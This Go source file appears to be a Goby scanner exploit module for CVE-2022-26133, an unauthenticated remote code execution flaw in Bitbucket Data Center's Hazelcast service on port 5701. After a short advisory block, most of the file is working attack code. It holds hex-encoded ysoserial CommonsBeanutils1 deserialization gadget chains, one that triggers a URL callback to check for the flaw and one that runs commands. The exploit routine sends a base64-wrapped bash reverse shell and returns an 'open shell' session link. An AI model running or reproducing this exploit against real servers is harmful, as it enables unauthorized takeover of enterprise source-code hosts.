package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Bitbucket Data Center Hazelcast Api Unauthenticated Remote Code Execution Vulnerability (CVE-2022-26133)",
    "Description": "<p>Atlassian Bitbucket Data Center is Atlassian's Git repository management solution that provides source code collaboration for enterprises that require high availability and performance at scale.</p><p>This vulnerability is caused by a deserialization vulnerability because the Hazelcast interface function in Atlassian Bitbucket Data Center does not filter user data effectively. An attacker can exploit this vulnerability to construct malicious data to execute arbitrary code remotely.</p>",
    "Impact": "<p>Bitbucket Data Center Unauthenticated Remote Code Execution Vulnerability (CVE-2022-26133)</p>",
    "Recommendation": "<p>The latest official version has been released, and affected users are advised to update and upgrade to the latest version in time. The link is as follows:</p><p><a href=\"https://www.atlassian.com/software/bitbucket/download-archives\">https://www.atlassian.com/software/bitbucket/download-archives</a></p>",
    "Product": "bitbucket",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Bitbucket Data Center Hazelcast 接口未认证远程代码执行漏洞（CVE-2022-26133）",
            "Product": "bitbucket",
            "Description": "<p>Atlassian Bitbucket Data Center 是 Atlassian 的 Git 存储库管理解决方案，其为需要高可用性和大规模性能的企业提供源代码协作。</p><p>该漏洞是由于 Atlassian Bitbucket Data Center 中的 Hazelcast 接口功能未对用户数据进行有效过滤，导致存在反序列化漏洞而引起的。攻击者利用该漏洞可以构造恶意数据远程执行任意代码。<br></p>",
            "Recommendation": "<p>当前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。链接如下：</p><p><a href=\"https://www.atlassian.com/software/bitbucket/download-archives\">https://www.atlassian.com/software/bitbucket/download-archives</a></p><p></p><p><a href=\"https://www.eq-3.de\"></a></p><p><a target=\"_Blank\" href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\"></a></p><p></p><p><a href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\"></a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Bitbucket Data Center Hazelcast Api Unauthenticated Remote Code Execution Vulnerability (CVE-2022-26133)",
            "Product": "bitbucket",
            "Description": "<p>Atlassian Bitbucket Data Center is Atlassian's Git repository management solution that provides source code collaboration for enterprises that require high availability and performance at scale.</p><p>This vulnerability is caused by a deserialization vulnerability because the Hazelcast interface function in Atlassian Bitbucket Data Center does not filter user data effectively. An attacker can exploit this vulnerability to construct malicious data to execute arbitrary code remotely.</p>",
            "Recommendation": "<p>The latest official version has been released, and affected users are advised to update and upgrade to the latest version in time. The link is as follows:</p><p><a href=\"https://www.atlassian.com/software/bitbucket/download-archives\">https://www.atlassian.com/software/bitbucket/download-archives</a></p>",
            "Impact": "<p>Bitbucket Data Center Unauthenticated Remote Code Execution Vulnerability (CVE-2022-26133)</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": " body=\"com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path\" || title=\"Atlassian Bitbucket\"",
    "GobyQuery": " body=\"com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path\" || title=\"Atlassian Bitbucket\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://www.atlassian.com/zh/software/bitbucket/enterprise",
    "DisclosureDate": "2022-04-15",
    "References": [
        "https://github.com/snowyyowl/writeups/tree/main/CVE-2022-26133"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-26133"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10358"
}`

	lenStrHex := func(str string) string {
		return strings.ToUpper(fmt.Sprintf("%04x", len(str)))
	}
	buildStrHex := func(str string) string {
		return strings.ToUpper(fmt.Sprintf("%x", str))
	}
	lenCmdHex := func(cmd string) string {
		return fmt.Sprintf("%04x", 1686+len(cmd))
	}
	buildCommandHex := func(cmd string) string {
		cmdHex := fmt.Sprintf("%04x", len(cmd))
		cmdHex += fmt.Sprintf("%x", cmd)
		return cmdHex
	}
	genHttpCommonsBeanutils1 := func(url string) string {
		templatePayload := "CAFEBABE0000003200480A0003002207004607002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E01000C6A6176612F6E65742F55524C07002A01"
		templatePayload += lenStrHex(url)
		templatePayload += buildStrHex(url)
		templatePayload += "08002C010015284C6A6176612F6C616E672F537472696E673B29560C000A002E0A002B002F01000E6F70656E436F6E6E656374696F6E01001A28294C6A6176612F6E65742F55524C436F6E6E656374696F6E3B0C003100320A002B00330100166A6176612F6E65742F55524C436F6E6E656374696F6E070035010007636F6E6E6563740C0037000B0A0036003801000F6765744865616465724669656C647301001128294C6A6176612F7574696C2F4D61703B0C003A003B0A0036003C0100136A6176612F6C616E672F457863657074696F6E07003E0100136A6176612F6C616E672F5468726F7761626C6507004001000F7072696E74537461636B54726163650C0042000B0A0041004301000D537461636B4D61705461626C6501"
		className := "ysoserial/Pwner" + goutils.RandomHexString(15)
		templatePayload += lenStrHex(className)
		templatePayload += buildStrHex(className)
		templatePayload += "01"
		templatePayload += strings.ToUpper(fmt.Sprintf("%04x", 2+len(className)))
		templatePayload += "4C"
		templatePayload += buildStrHex(className)
		templatePayload += "3B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F004700000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0047000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F004700000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000055000400050000002BA70003014CBB002B59122DB700304D2CB600344E2DB600392DB6003D57A7000D3A041904B60044A70003B100010005001D0020003F0001004500000010000303FF001C00020005000107003F090002002000000002002100110000000A00010002002300100009"
		payload := "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B7870000000027372002B6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72E3A188EA7322A4480200024C000A636F6D70617261746F7271007E00014C000870726F70657274797400124C6A6176612F6C616E672F537472696E673B78707372003F6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707400106F757470757450726F706572746965737704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E002000078700000"
		payload += strings.ToUpper(fmt.Sprintf("%04x", len(templatePayload)/2))
		payload += templatePayload
		payload += "7571007E0010000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E72707701007871007E000D78"
		return payload
	}
	genCommonsBeanutils1Hex := func(cmd string) string {
		hexPayload1 := "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e002000078700000"
		hexPayload2 := "cafebabe0000003200390a0003002207003707002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e01"
		hexPayload3 := "08003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b003401000d537461636b4d61705461626c6501001e79736f73657269616c2f50776e65723130353334363230363130373537380100204c79736f73657269616c2f50776e65723130353334363230363130373537383b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003800000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0038000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003800000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000024000300020000000fa70003014cb8002f1231b6003557b1000000010036000000030001030002002000000002002100110000000a000100020023001000097571007e0010000001d4cafebabe00000032001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000450776e72707701007871007e000d78"
		payload := hexPayload1 + lenCmdHex(cmd) + hexPayload2 + buildCommandHex(cmd) + hexPayload3
		return payload
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			host := fmt.Sprintf("%s:%s", u.IP, "5701")
			s, _ := hex.DecodeString("000000027361")
			conn, _ := httpclient.GetTCPConn(host, time.Second*5)
			defer conn.Close()
			_, _ = conn.Write(s)
			buf := make([]byte, 0, 4096)
			tmp := make([]byte, 256)
			for {
				n, err := conn.Read(tmp)
				if err != nil {
					if err != io.EOF {
						log.Println("read error:", err)
					}
					break
				}
				buf = append(buf, tmp[:n]...)
			}
			bk1 := hex.EncodeToString(buf)
			checkStr := goutils.RandomHexString(4)
			if strings.Contains(bk1, "0000") {
				checkUrl, _ := godclient.GetGodCheckURL(checkStr)
				payload := fmt.Sprintf("%sffffff9c%s", bk1, genHttpCommonsBeanutils1("http://"+checkUrl))
				p, _ := hex.DecodeString(payload)
				conn, _ := httpclient.GetTCPConn(host, time.Second*5)
				defer conn.Close()
				_, _ = conn.Write(p)
			}
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			host := fmt.Sprintf("%s:%s", expResult.HostInfo.IP, "5701")
			s, _ := hex.DecodeString("000000027361")
			conn, _ := httpclient.GetTCPConn(host, time.Second*5)
			defer conn.Close()
			_, _ = conn.Write(s)
			buf := make([]byte, 0, 4096)
			tmp := make([]byte, 256)
			for {
				n, err := conn.Read(tmp)
				if err != nil {
					if err != io.EOF {
						log.Println("read error:", err)
					}
					break
				}
				buf = append(buf, tmp[:n]...)
			}
			bk1 := hex.EncodeToString(buf)
			if strings.Contains(bk1, "0000") {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					cmd = goutils.BashBase64CMD(cmd)
					payload := fmt.Sprintf("%sffffff9c%s", bk1, genCommonsBeanutils1Hex(cmd))
					p, _ := hex.DecodeString(payload)
					conn, _ := httpclient.GetTCPConn(host, time.Second*5)
					defer conn.Close()
					_, _ = conn.Write(p)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			}
			return expResult
		},
	))
}
